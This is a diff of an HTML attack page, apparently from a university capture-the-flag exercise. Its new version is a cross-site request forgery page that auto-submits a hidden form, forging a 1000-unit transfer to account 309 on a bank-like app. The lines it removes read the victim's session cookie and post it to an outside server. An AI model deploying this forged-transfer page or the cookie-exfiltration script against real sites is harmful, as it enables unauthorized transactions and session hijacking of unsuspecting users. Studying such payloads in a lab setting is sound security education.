@@ -1,17 +1,13 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <form action="http://svb:5003/" method="GET">
-        </form>
+        <form action="http://svb:5003/transfer/1" method="POST">
+			<input class="input is-large" type="text" name="account" value="309">
+			<input class="input is-large" type="text" name="amount" value="1000">
+		</form>
         <script>
             document.forms[0].submit();
             
-            // Send the session cookie to attacker's server
-            var cookie = document.cookie;
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://cs2107-ctfd-i.comp.nus.edu:5003/");
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("cookie=" + cookie);
         </script>
     </body>
 </html>
